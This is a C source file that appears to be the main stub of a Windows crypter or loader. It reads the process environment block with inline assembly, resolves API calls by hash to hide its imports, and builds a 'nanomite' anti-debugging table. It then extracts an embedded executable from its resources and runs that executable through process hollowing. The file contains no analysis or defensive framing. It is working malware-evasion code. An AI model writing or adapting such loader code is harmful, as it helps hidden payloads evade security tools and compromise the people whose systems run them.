#include "cyann.h"
#include "api_function.h"

DWORD	shash(char *s)
{
	DWORD   i;

        i = 0;
        while (*s)
        {
                i *= 16777619;
                i ^= *s++;
        }
        return (i);
}

DWORD	whash(PWSTR s)
{
	DWORD	i;

	i = 0;
	while (*s)
	{
		i *= 16777619;
		i ^= *s++;
	}
	return (i);
}


void	get_peb(DWORD *peb)
{
	if (peb)
		asm("push %%fs:0x18\n"
		"mov (%%esp), %%eax\n"
            	"pop %%ebx\n"
            	"mov 0x30(%%eax), %0"
		: "=a"(*peb) :
		);
}

LPWSTR	get_me(void)
{
	WCHAR			buffer[MAX_PATH];
	LPWSTR			str;
	DWORD			size;
	GETMODULEFILENAME	getfn;

	if (!(getfn = (GETMODULEFILENAME)resolve_symbol(&g_fonctions[16])))
		return (NULL);
	if (!(size = getfn(NULL, buffer, MAX_PATH)))
		return (NULL);
	if (!(str = (LPWSTR)malloc(sizeof(WCHAR) * size)))
		return (NULL);
	wcscpy(str, buffer);
	return (str);
}

int main(void)
{
	LPWSTR	memyselfandi;
	WCHAR resid[128] = L"X32";
	WCHAR rsrc[128] = L"NM32";
	PUCHAR	bin;
	t_pe	*pe;

	get_peb(&g_peb);
	if (!(memyselfandi = get_me()))
		return (1);
	g_ntable = make_nanomited_table(rsrc);
	if ((bin = extract_rsrc(resid)))
	{
		pe = parse_pe(bin);
		process_hollow(memyselfandi, pe);
		free_pe(pe);
	}
	free(memyselfandi);
	return (0);
}
